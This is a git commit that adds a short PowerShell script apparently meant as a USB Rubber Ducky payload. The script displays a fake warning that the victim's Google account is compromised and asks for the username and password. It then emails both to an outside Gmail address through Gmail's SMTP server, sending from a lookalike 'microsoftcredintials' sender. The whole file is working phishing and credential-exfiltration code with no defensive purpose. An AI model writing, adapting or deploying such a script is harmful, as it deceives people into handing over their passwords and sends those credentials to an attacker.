40ac4f90a34efd79f98a11f5976341f0c7666bfe
Zekgame <168453184+Zekgame@users.noreply.github.com>
2024-05-28 11:07:53 +0800

    Add files via upload

---
+++ Duckyscrip.ps1
@@ -0,0 +1,12 @@
+﻿clear
+$mycredentials = Get-Credential
+Write-Host "ALERT your google account has been compromised! please enter your credentials for verification"
+
+$name = Read-Host "Username/Email"
+$pwd = Read-Host "password"
+
+
+
+
+Send-MailMessage -SmtpServer smtp.gmail.com -Port 587 -UseSsl -From microsoftcredintials@gmail.com -To thyversionmusic@gmail.com -Subject 'Hello from the ducky' -Body ("$name $pwd") -Credential ($mycredentials)
+exit
